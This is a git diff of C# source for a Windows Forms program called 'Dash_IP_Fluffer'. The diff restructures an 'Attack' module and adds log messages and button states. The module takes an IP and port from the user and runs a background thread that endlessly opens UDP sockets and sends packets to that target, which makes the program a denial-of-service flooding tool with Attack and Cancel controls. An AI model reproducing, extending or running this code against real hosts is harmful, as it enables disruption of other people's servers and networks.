@@ -10,74 +10,87 @@ using System.Collections.Generic;
 
 namespace Dash_IP_Fluffer
 {
-    public static class Modules
-    {
-	public static class Attack
-	{
-	    private static readonly List<Thread> threads = new List<Thread>();
-	    private static readonly List<Socket> sockets = new List<Socket>();
-
-	    public static void Launch()
-	    {
-		string[] arr = Primary.ipbox.Text.Split(':');
-
-		IPAddress tango = IPAddress.Parse(arr[0]);
-		Int32 port = int.Parse(arr[1]);
-
-		threads.Add
-		(
-		    new Thread
-		    (
-			() =>
-			{
-			    string bytes = "dashness";
-
-			    for (int b = 0; b < bytes.Length * 40000; b += 1)
-			    {
-				bytes += ("dashness");
-			    };
-
-			    while (true)
-			    {
-				using (Socket socks = new Socket(SocketType.Dgram, ProtocolType.Udp))
-				{
-				    socks.Connect(tango, port);
-				    socks.Send(Encoding.ASCII.GetBytes("Dashness"));
-
-				    sockets.Add(socks);
-				};
-			    };
-			}
-		    )
-
-		    { IsBackground = true }
-		);
-
-		threads[0].Start();
-	    }
-
-	    public static void Cancel()
-	    {
-		foreach (Thread thread in threads)
-		{
-		    thread.Abort();
-		};
-
-		foreach (Socket socket in sockets)
-		{
-		    socket.Dispose();
-		};
-
-		sockets.Clear();
-		threads.Clear();
-	    }
-	};
-    };
-
     public class Secondary
     {
-	private readonly PictureBox optional_button_container = new PictureBox();
-	private readonly Button settings = new Button(), attack = new Button(), tools = new Button();
+	public static class Modules
+	{
+	    public static class Attack
+	    {
+		private static readonly List<Thread> threads = new List<Thread>();
+		private static readonly List<Socket> sockets = new List<Socket>();
+
+		public static void Launch()
+		{
+		    MonitorLog.logtext.AppendText("Launching your attack ....");
+		    attack.Text = "Loading";
+
+		    string[] arr = Primary.ipbox.Text.Split(':');
+
+		    IPAddress tango = IPAddress.Parse(arr[0]);
+		    Int32 port = int.Parse(arr[1]);
+
+		    threads.Add
+		    (
+			new Thread
+			(
+			    () =>
+			    {
+				string bytes = "dashness";
+
+				for (int b = 0; b < bytes.Length * 40000; b += 1)
+				{
+				    bytes += ("dashness");
+				};
+
+				while (true)
+				{
+				    using (Socket socks = new Socket(SocketType.Dgram, ProtocolType.Udp))
+				    {
+					socks.Connect(tango, port);
+					socks.Send(Encoding.ASCII.GetBytes("Dashness"));
+
+					sockets.Add(socks);
+				    };
+				};
+			    }
+			)
+
+			{ IsBackground = true }
+		    );
+
+		    threads[0].Start();
+
+		    MonitorLog.logtext.AppendText("Attacking!");
+		    attack.Text = "Cancel";
+		}
+
+		public static void Cancel()
+		{
+		    MonitorLog.logtext.AppendText("Cancelling all workers ....");
+		    attack.Text = "Loading";
+
+		    foreach (Thread thread in threads)
+		    {
+			thread.Abort();
+		    };
+
+		    foreach (Socket socket in sockets)
+		    {
+			socket.Dispose();
+		    };
+
+		    sockets.Clear();
+		    threads.Clear();
+
+		    MonitorLog.logtext.AppendText("Done!");
+		    attack.Text = "Attack";
+		}
+	    };
+	};
+
+	readonly PictureBox optional_button_container = new PictureBox();
+
+	readonly static Button settings = new Button(), attack = new Button(), tools = new Button();
 
 	readonly Form owner = (Form) Interfuce.interfuce;
 
@@ -112,22 +125,14 @@ namespace Dash_IP_Fluffer
 		{
 		    if (attack.Text.Equals("Attack"))
 		    {
-			MonitorLog.logtext.AppendText("Starting .....\r\n");
 			Modules.Attack.Launch();
-			MonitorLog.logtext.AppendText("Attacking!\r\n");
 
 			attack.Text = ("Cancel");
 		    }
 
 		    else if (!attack.Text.Equals("Loading"))
 		    {
-			attack.Text = ("Loading");
-
-			MonitorLog.logtext.AppendText("Stopping .....\r\n");
 			Modules.Attack.Cancel();
-			MonitorLog.logtext.AppendText("Waiting ....");
-
-			attack.Text = ("Attack");
 		    };
 		};
 	    }
